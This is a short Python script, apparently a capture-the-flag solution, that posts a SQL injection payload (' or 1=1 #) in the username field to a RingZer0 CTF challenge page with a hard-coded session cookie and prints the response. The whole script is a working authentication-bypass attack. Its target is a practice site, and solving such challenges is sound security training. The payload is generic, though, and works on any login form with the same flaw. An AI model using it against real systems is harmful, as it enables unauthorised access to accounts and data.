import requests

cookies = {"PHPSESSID": "vgptbvovnjugfffmbi9ajtg0p4"}
url = "https://ringzer0ctf.com/challenges/2"
data = {"username":"' or 1=1 #"}
r = requests.post(url, cookies=cookies, data=data)
print r.text